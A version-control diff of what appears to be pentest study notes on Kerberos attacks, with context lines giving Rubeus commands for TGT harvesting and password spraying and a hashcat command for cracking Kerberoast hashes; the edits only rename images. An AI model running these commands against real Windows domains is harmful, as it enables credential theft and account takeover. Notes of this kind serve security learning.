@@ -12,7 +12,7 @@ _For pass the ticket attack_
 
 `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Brute-Forcing / Password-Spraying
 
@@ -28,7 +28,7 @@ Before password spraying with Rubeus, you need to add the domain controller doma
 
 `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt="" width="523"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt="" width="523"><figcaption></figcaption></figure>
 
 ## Kerberoasting
 
@@ -42,7 +42,7 @@ copy the hash onto your attacker machine and put it into a .txt file so we can c
 
 `hashcat -m 13100 -a 0 hash.txt wordlist.txt` - now crack that hash
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Impacket
 
